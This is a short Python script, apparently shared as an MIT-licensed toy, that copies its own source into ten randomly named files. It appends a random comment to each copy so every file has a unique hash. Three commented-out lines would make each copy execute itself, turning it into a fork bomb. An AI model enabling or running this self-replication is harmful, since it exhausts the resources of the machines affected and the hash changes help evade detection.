#!/usr/bin/env python3

"""
This script self-replicates similar to a fork bomb. Each file created will have a unique hash.
You can safely run this script without the self-replication functionality, by leaving out the 3 lines of code in
the function write_files (these lines are commented out by default).

@Author: 4gnusd3i
@License: MIT
"""

import random
import string
import subprocess
import os


def main():
    write_files(read_file())


# Generates a random string with the received length, and returns it
def random_id(string_length=0):
    characters = string.ascii_letters
    return "".join(random.choice(characters) for char in range(string_length))


# Reads and stores the content of this file before returning it
def read_file():
    path = __file__
    content = open(path, "r").read()
    return content


# Writes the stored content from read_file to 10 new files before appending what's returned from random_id
# This ensures that each file has an unique hash, without affecting the script-operations
def write_files(content):
    folder_name = random_id(16)
    folder_path = "./{}/".format(folder_name)
    os.mkdir(folder_path)

    for i in range(10):
        random_name = random_id(64)
        file_w = open("{b}{c}".format(b=folder_path, c=random_name), "w")
        file_w.write(content)
        file_w.close()
        file_a = open("{b}{c}".format(b=folder_path, c=random_name), "a")
        file_a.write("\n# {}\n".format(random_id(118)))
        file_a.close()
        # !WARNING! The next 3 lines of code makes this into a forkbomb !WARNING!
        # absolute_path = (os.path.abspath(os.getcwd()))
        # !ATTENTION! The first line below is Linux specific !ATTENTION!
        # os.system("chmod +x {}{}{}".format(absolute_path, folder_path, random_name))
        # subprocess.call("{}{}{}".format(absolute_path, folder_path, random_name))


if __name__ == "__main__":
    main()
